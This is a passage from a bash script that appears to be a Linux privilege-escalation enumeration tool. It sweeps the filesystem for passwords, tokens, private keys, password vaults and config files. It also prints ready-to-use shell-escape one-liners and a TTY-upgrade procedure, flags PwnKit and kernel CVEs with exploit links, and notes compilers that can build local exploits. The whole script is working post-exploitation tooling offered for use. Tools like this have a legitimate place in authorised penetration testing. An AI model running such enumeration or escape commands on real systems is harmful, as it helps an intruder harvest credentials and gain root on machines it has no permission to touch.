# ══════════════════════════════════════════════
begin_section "12_interesting_files" "12. INTERESTING FILES"

cap "Credential Keywords in Files"   "grep -rl 'password\|passwd\|secret\|api_key\|token\|DB_PASS' /var/www /opt /srv /home 2>/dev/null | head -20"
cap "Recently Modified (10 days)"    "find / -type f -mtime -10 ! -path '/proc/*' ! -path '/sys/*' 2>/dev/null | head -25"
cap "Backup / Old Files"             "find / \( -name '*.bak' -o -name '*.old' -o -name '*.backup' -o -name '*.swp' -o -name '*~' \) 2>/dev/null | head -20"
cap "Private Key Files"              "find / \( -name '*.pem' -o -name '*.key' -o -name 'id_rsa' -o -name 'id_dsa' -o -name 'id_ecdsa' -o -name 'id_ed25519' \) 2>/dev/null | head -15"
cap "Database Files"                 "find / \( -name '*.db' -o -name '*.sqlite' -o -name '*.sqlite3' \) 2>/dev/null | head -15"
cap "Password Managers / Vaults"     "find / \( -name '*.kdbx' -o -name '.vault-token' -o -name 'pass' \) 2>/dev/null | head -10"
cap "Config / .env Files"            "find / \( -name '.env' -o -name '*.conf' -o -name '*.cfg' \) 2>/dev/null | grep -v proc | head -20"
cap "Script Files (sh/py/pl)"        "find / \( -name '*.sh' -o -name '*.py' -o -name '*.pl' \) 2>/dev/null | grep -v proc | head -20"
cap "Log Files with Passwords"       "grep -rli 'password\|passwd' /var/log/ 2>/dev/null | head -10"
cap "Hidden Files in Home"           "find /home /root -name '.*' -type f 2>/dev/null | head -20"
cap "Files Owned by Current User"    "find / -user \$(whoami) -type f 2>/dev/null | grep -v proc | head -20"
cap "World-Readable Sensitive Files" "find / -perm -o+r \( -name 'shadow' -o -name 'sudoers' -o -name '.htpasswd' \) 2>/dev/null"

end_section

# ══════════════════════════════════════════════
#  SECTION 13 — D-BUS / POLKIT
# ══════════════════════════════════════════════
begin_section "13_dbus_polkit" "13. D-BUS / POLKIT"

cap "Polkit Version"                 "pkexec --version 2>/dev/null || dpkg -l policykit-1 2>/dev/null | tail -1"
cap "D-Bus Services"                 "busctl list 2>/dev/null | head -30"
cap "D-Bus Interfaces"               "dbus-send --system --print-reply --dest=org.freedesktop.DBus /org/freedesktop/DBus org.freedesktop.DBus.ListNames 2>/dev/null | head -20"
cap "Polkit Rules"                   "ls -la /etc/polkit-1/rules.d/ 2>/dev/null && cat /etc/polkit-1/rules.d/*.rules 2>/dev/null"
cap "Polkit Local Authority"         "ls -la /etc/polkit-1/localauthority/ 2>/dev/null"

{
    echo "-------- Polkit CVE Hints --------"
    echo "CVE-2021-4034 (PwnKit): Affects pkexec < 0.120 on most Linux distros"
    echo "Check: pkexec --version"
    echo "PoC  : https://github.com/ly4k/PwnKit"
    echo ""
    echo "CVE-2021-3560: Affects polkit < 0.119, RHEL8, Ubuntu 20.04"
    echo ""
} >> "$SEC_FILE"

end_section

# ══════════════════════════════════════════════
#  SECTION 14 — SHELL ESCAPES
# ══════════════════════════════════════════════
begin_section "14_shell_escapes" "14. SHELL ESCAPE / JAIL BREAK"

{
    echo "-------- Shell Escape Methods Available on This System --------"
    echo ""
    command -v python  &>/dev/null && echo "[+] python  -c 'import pty; pty.spawn(\"/bin/bash\")'"
    command -v python3 &>/dev/null && echo "[+] python3 -c 'import pty; pty.spawn(\"/bin/bash\")'"
    command -v perl    &>/dev/null && echo "[+] perl    -e 'exec \"/bin/bash\";'"
    command -v ruby    &>/dev/null && echo "[+] ruby    -e 'exec \"/bin/bash\"'"
    command -v lua     &>/dev/null && echo "[+] lua     -e 'os.execute(\"/bin/bash\")'"
    command -v awk     &>/dev/null && echo "[+] awk     'BEGIN {system(\"/bin/bash\")}'"
    command -v vi      &>/dev/null && echo "[+] vi      → :!/bin/bash"
    command -v vim     &>/dev/null && echo "[+] vim     → :!/bin/bash"
    command -v less    &>/dev/null && echo "[+] less    → !/bin/bash"
    command -v more    &>/dev/null && echo "[+] more    → !/bin/bash"
    command -v find    &>/dev/null && echo "[+] find    . -exec /bin/bash \\; -quit"
    command -v nmap    &>/dev/null && echo "[+] nmap    --interactive → !sh"
    command -v expect  &>/dev/null && echo "[+] expect  → spawn /bin/bash"
    command -v script  &>/dev/null && echo "[+] script  -qc /bin/bash /dev/null"
    command -v socat   &>/dev/null && echo "[+] socat   - EXEC:/bin/bash,pty,stderr,setsid,sigint,sane"
    command -v tclsh   &>/dev/null && echo "[+] tclsh   → exec /bin/bash"
    command -v zip     &>/dev/null && echo "[+] zip     /tmp/x.zip /tmp/x -T --unzip-command='sh -c /bin/bash'"
    command -v tar     &>/dev/null && echo "[+] tar     -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/bash"
    echo ""
    echo "-------- TTY Upgrade (after shell obtained) --------"
    echo "Step 1: python3 -c 'import pty;pty.spawn(\"/bin/bash\")'"
    echo "Step 2: Ctrl+Z"
    echo "Step 3: stty raw -echo && fg"
    echo "Step 4: reset"
    echo "Step 5: export TERM=xterm && export SHELL=bash"
    echo "Step 6: stty rows <rows> cols <cols>"
    echo ""
} >> "$SEC_FILE"

section "Available Shell Escape Methods"
[ "$QUIET" -eq 0 ] && {
    command -v python  &>/dev/null && info "python  pty.spawn available"
    command -v python3 &>/dev/null && info "python3 pty.spawn available"
    command -v perl    &>/dev/null && info "perl exec available"
    command -v vi      &>/dev/null && info "vi :!/bin/bash available"
    command -v find    &>/dev/null && info "find -exec available"
    command -v socat   &>/dev/null && info "socat pty available"
}

end_section

# ══════════════════════════════════════════════
#  SECTION 15 — KERNEL EXPLOIT HINTS
# ══════════════════════════════════════════════
begin_section "15_kernel_exploits" "15. KERNEL EXPLOIT HINTS"

{
    echo "-------- Kernel Info --------"
    echo "Kernel  : $KERNEL"
    echo "Arch    : $ARCH"
    uname -a
    echo ""
    echo "-------- Exploit-DB Search Links --------"
    echo "https://www.exploit-db.com/search?q=${KERNEL}"
    echo "https://www.exploit-db.com/search?q=linux+kernel+$(echo "$KERNEL" | cut -d. -f1-2)"
    echo ""
    echo "-------- Compilers (for compiling local exploits) --------"
    for c in gcc g++ cc make; do
        path=$(command -v "$c" 2>/dev/null)
        [ -n "$path" ] && echo "[!!] $c available: $path  — can compile local exploits"
    done
    echo ""
    echo "-------- Notable Kernel CVEs (check your version) --------"
    echo "DirtyCow    CVE-2016-5195  : kernel 2.x–4.8.2"
    echo "DirtyPipe   CVE-2022-0847  : kernel 5.8–5.16.11"
    echo "PwnKit      CVE-2021-4034  : pkexec (polkit) all versions"
    echo "OverlayFS   CVE-2021-3493  : Ubuntu < 20.04 LTS"
    echo "Netfilter   CVE-2022-25636 : kernel 5.4–5.6"
    echo "GameOver(lay) CVE-2023-2640/32629: Ubuntu 22.04/23.04"
    echo ""
    echo "-------- Reference --------"
    echo "https://www.cvedetails.com/vulnerability-list/vendor_id-33/product_id-47/Linux-Linux-Kernel.html"
    echo "https://github.com/mzet-/linux-exploit-suggester"
    echo "https://github.com/jondonas/linux-exploit-suggester-2"
    echo ""
} >> "$SEC_FILE"

info "Kernel: $KERNEL  Arch: $ARCH"
warn "Check https://www.exploit-db.com for kernel: $KERNEL"
command -v gcc &>/dev/null && warn "gcc found — can compile kernel exploits"

end_section

# ══════════════════════════════════════════════
#  FINALIZE SUMMARY
# ══════════════════════════════════════════════
{
    echo "========================================================"
    echo "  FILES WRITTEN"
    echo "========================================================"
    ls -1 "${OUTDIR}/"
    echo ""
    echo "========================================================"
    echo "  PRIORITY NEXT STEPS"
    echo "========================================================"
    echo "1.  Review  09_exploit_vectors.txt     — [!!] SUID/Sudo/GTFOBins hits"
    echo "2.  Review  05_nfs_shares.txt          — no_root_squash NFS exports"
    echo "3.  Review  07_filesystem_perms.txt    — writable PATH dirs, cron scripts"
    echo "4.  Review  03_services_apps.txt       — writable systemd units, cron scripts"
    echo "5.  Review  06_credentials.txt         — plaintext secrets, SSH keys"
    echo "6.  Review  08_proc_leaks.txt          — /proc env credential leaks"
    echo "7.  Review  02_user_info.txt           — writable /etc/passwd or /etc/shadow"
    echo "8.  Review  11_containers_virt.txt     — docker.sock, lxd group"
    echo "9.  Review  13_dbus_polkit.txt         — polkit version (PwnKit CVE-2021-4034)"
    echo "10. Review  15_kernel_exploits.txt     — kernel CVE matches"
    echo ""
    echo "Tools to run after:"
    echo "  linux-exploit-suggester : https://github.com/mzet-/linux-exploit-suggester"
    echo "  linpeas                 : https://github.com/carlospolop/PEASS-ng"
    echo "  GTFOBins                : https://gtfobins.github.io"
    echo ""
    echo "Generated: $(date)"
} >> "$SUMMARY"

# ══════════════════════════════════════════════
#  FINAL TERMINAL SUMMARY
# ══════════════════════════════════════════════
banner "ENUMERATION COMPLETE"
tprint "  ${BOLD}${GREEN}Output directory:${RESET} ${OUTDIR}/"
tprint ""
tprint "  ${BOLD}Files written:${RESET}"
ls -1 "${OUTDIR}/" | while read -r f; do
    tprint "    ${CYAN}→${RESET} ${OUTDIR}/${f}"
done
tprint ""
tprint "  ${BOLD}Priority Checks:${RESET}"
tprint "  1. ${YELLOW}09_exploit_vectors.txt${RESET}   — GTFOBins SUID/Sudo [!!] hits"
tprint "  2. ${YELLOW}05_nfs_shares.txt${RESET}        — no_root_squash exports"
tprint "  3. ${YELLOW}07_filesystem_perms.txt${RESET}  — writable PATH / cron scripts"
tprint "  4. ${YELLOW}06_credentials.txt${RESET}       — plaintext secrets & SSH keys"
tprint "  5. ${YELLOW}08_proc_leaks.txt${RESET}        — /proc environ credential leaks"
tprint "  6. ${YELLOW}02_user_info.txt${RESET}         — writable /etc/passwd or shadow"
tprint "  7. ${YELLOW}11_containers_virt.txt${RESET}   — docker.sock / lxd group"
tprint "  8. ${YELLOW}13_dbus_polkit.txt${RESET}       — polkit / PwnKit CVE-2021-4034"
tprint "  9. ${YELLOW}15_kernel_exploits.txt${RESET}   — kernel CVE matches"
tprint ""
